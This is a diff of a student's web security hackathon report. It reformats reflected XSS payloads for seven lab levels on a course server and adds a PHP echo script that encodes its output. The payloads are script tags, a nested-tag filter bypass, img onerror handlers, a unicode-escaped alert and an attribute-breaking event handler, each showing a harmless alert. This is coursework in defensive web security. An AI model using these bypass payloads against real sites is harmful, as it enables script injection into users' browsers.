@@ -42,7 +42,7 @@ web application, i.e., where the vulnerability is exploited (2 pts each)_
 
 +  Level 0:
 
-```
+```js
 <script>alert("Level 0-hacked by Amit Gaddi")</script>"
 
 ```
@@ -52,10 +52,10 @@ web application, i.e., where the vulnerability is exploited (2 pts each)_
 
 +  Level 1:
 
-```
-http://waph-hackathon.eastus.cloudapp.azure.com/xss/level1/echo.php?input=%3Cscript%3Ealert(%22Level%201-hacked%20by%20Amit%20Gaddi%22)%3C/script%3E%22
 
-```
+<http://waph-hackathon.eastus.cloudapp.azure.com/xss/level1/echo.php?input=%3Cscript%3Ealert(%22Level%201-hacked%20by%20Amit%20Gaddi%22)%3C/script%3E%22>
+
+
 ![Screenshot](images/Screenshot1.png)   
 
 +  Level 2:
@@ -85,30 +85,30 @@ Included file `Level2.html`
 
 +  Level 3:
 
-```
-http://waph-hackathon.eastus.cloudapp.azure.com/xss/level3/echo.php?input=%3Csc%3Cscript%3Eript%3Ealert(%27level-3%20hacked%20by%20Amit%20Gaddi%27)%3C/sc%3C/script%3Eript%3E
 
-```
+<http://waph-hackathon.eastus.cloudapp.azure.com/xss/level3/echo.php?input=%3Csc%3Cscript%3Eript%3Ealert(%27level-3%20hacked%20by%20Amit%20Gaddi%27)%3C/sc%3C/script%3Eript%3E>
+
+
 
 
 ![Screenshot](images/Screenshot3.png)   
 
 +  Level 4:
 
-```
-http://waph-hackathon.eastus.cloudapp.azure.com/xss/level4/echo.php?input=%3Cimg%20src=%22..%22%20onerror=%22alert(%27Level%204%20:%20Hacked%20by%20Amit%20Gaddi%27)%22%3E
 
-```
+<http://waph-hackathon.eastus.cloudapp.azure.com/xss/level4/echo.php?input=%3Cimg%20src=%22..%22%20onerror=%22alert(%27Level%204%20:%20Hacked%20by%20Amit%20Gaddi%27)%22%3E>
+
+
 
 
 ![Screenshot](images/Screenshot4.png)   
 
 +  Level 5:
 
-```
-http://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php?input=%3Cimg%20src=%22..%22%20onerror=%22%5Cu0061lert(%27Level%205:%20Hacked%20By%20Amit%20Gaddi%27)%22%3E
 
-```
+<http://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php?input=%3Cimg%20src=%22..%22%20onerror=%22%5Cu0061lert(%27Level%205:%20Hacked%20By%20Amit%20Gaddi%27)%22%3E>
+
+
 
 
 ![Screenshot](images/Screenshot5.png)   
@@ -116,10 +116,11 @@ http://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php?input=%3Cimg
 
 +  Level 6:
 
-```
-http://waph-hackathon.eastus.cloudapp.azure.com/xss/level6/echo.php/%22%20onmouseenter=%22alert('level%206:%20Hacked%20by%20Amit%20Gaddi%20%20')%22
 
-```
+<http://waph-hackathon.eastus.cloudapp.azure.com/xss/level6/echo.php/%22%20onmouseenter=%22alert('level%206:%20Hacked%20by%20Amit%20Gaddi%20%20')%22>  
+
+
+
 
 
 ![Screenshot](images/Screenshot61.png)   
@@ -134,6 +135,16 @@ http://waph-hackathon.eastus.cloudapp.azure.com/xss/level6/echo.php/%22%20onmous
 + echo.php (from Lab 1) (3 pts)
 
 
+Included file `echo.php`
+```php
+<?php
+  if (!isset($_REQUEST["data"])) {
+    die("{\"error\":\"please provide 'data' field\"}");
+  }
+  echo htmlentities($_REQUEST["data"]);
+?>
+
+```
   
 + Current front-end prototype (Lab 2) (12 pts): identify external input data channels, where you must validate the data before using it, and encode the data before displaying/injecting in the front-end interface, i.e., webpage
 
